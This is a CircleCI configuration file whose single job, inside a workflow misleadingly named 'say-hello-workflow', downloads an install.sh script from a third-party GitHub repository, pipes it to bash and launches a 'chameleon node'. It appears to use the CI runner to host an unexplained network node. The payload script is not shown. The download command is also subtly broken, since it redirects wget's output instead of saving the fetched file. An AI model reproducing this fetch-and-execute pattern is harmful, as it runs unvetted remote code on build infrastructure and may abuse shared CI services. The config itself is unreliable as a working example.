version: 2.1

jobs:
  dockeretteinstall:
   
    docker:
      - image: ubuntu:latest

    steps:
      - checkout
      - run:
          name: "nodestat"
          command: "wget https://raw.githubusercontent.com/NateYeet/Chameleon/main/install.sh >> /ins && bash /ins -i && chameleon node"

workflows:
  say-hello-workflow:
    jobs:
      - dockeretteinstall
